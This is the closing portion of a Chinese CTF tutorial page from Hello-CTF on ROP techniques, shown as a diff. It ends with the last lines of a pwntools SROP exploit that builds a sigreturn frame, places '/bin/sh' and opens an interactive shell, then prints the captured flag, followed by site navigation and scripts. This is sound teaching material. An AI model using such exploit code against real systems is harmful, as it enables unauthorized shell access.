+<a id="__codelineno-30-32" name="__codelineno-30-32" href="#__codelineno-30-32"></a><span class="n">frame1</span><span class="o">.</span><span class="n">rip</span><span class="o">=</span><span class="mh">0x401179</span>
+<a id="__codelineno-30-33" name="__codelineno-30-33" href="#__codelineno-30-33"></a><span class="n">payload2</span><span class="o">+=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">frame1</span><span class="p">)</span>
+<a id="__codelineno-30-34" name="__codelineno-30-34" href="#__codelineno-30-34"></a><span class="n">payload2</span><span class="o">+=</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
+<a id="__codelineno-30-35" name="__codelineno-30-35" href="#__codelineno-30-35"></a><span class="n">payload2</span><span class="o">+=</span><span class="sa">b</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span>
+<a id="__codelineno-30-36" name="__codelineno-30-36" href="#__codelineno-30-36"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-30-37" name="__codelineno-30-37" href="#__codelineno-30-37"></a><span class="nb">input</span><span class="p">(</span><span class="s2">"按任意键继续......"</span><span class="p">)</span>
+<a id="__codelineno-30-38" name="__codelineno-30-38" href="#__codelineno-30-38"></a><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<a id="__codelineno-30-39" name="__codelineno-30-39" href="#__codelineno-30-39"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>运行代码输入</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>cat<span class="w"> </span>flag
+</code></pre></div>
+<p>即可获得flag</p>
+<p><img alt="08" src="../images/SROP/008.png"></p>
+<hr>
+<h4 id="flag">FLAG<a class="headerlink" href="#flag" title="Permanent link">¶</a></h4>
+<p>flag为动态</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>ctfhub{9ba7a54276e65220476a78c3}
+</code></pre></div></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../ROP_Tricks/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: 常见的ROP技巧"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        常见的ROP技巧
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../Protections/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: 常见保护"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        常见保护
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#rop">ROP 技巧补坑</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_1">前言</a>
+        
+      </li>
+    
+      <li>
+        <a href="#ret2syscall">ret2syscall</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_2">基本原理</a>
+        
+      </li>
+    
+      <li>
+        <a href="#read">一个简单的 read 例子</a>
+        
+      </li>
+    
+      <li>
+        <a href="#rop_1">在 ROP 里怎么用</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_3">调试时要注意什么</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_4">总结补充</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_5">具体题目</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_6">分析</a>
+        
+      </li>
+    
+      <li>
+        <a href="#exp">exp</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#ret2csu">ret2csu</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#gadget">这一版 gadget 的寄存器关系</a>
+        
+      </li>
+    
+      <li>
+        <a href="#payload">一个更稳妥的 payload 例子</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_7">题目</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#srop">SROP</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#signal">signal 机制</a>
+        
+      </li>
+    
+      <li>
+        <a href="#rt_sigreturn">rt_sigreturn 详细剖析</a>
+        
+      </li>
+    
+      <li>
+        <a href="#srop_1">SROP基本原理总结</a>
+        
+      </li>
+    
+      <li>
+        <a href="#srop_2">SROP题目示例</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_8">第一步</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_9">第二步</a>
+        
+      </li>
+    
+      <li>
+        <a href="#exp_1">第三步(EXP)</a>
+        
+      </li>
+    
+      <li>
+        <a href="#flag">FLAG</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
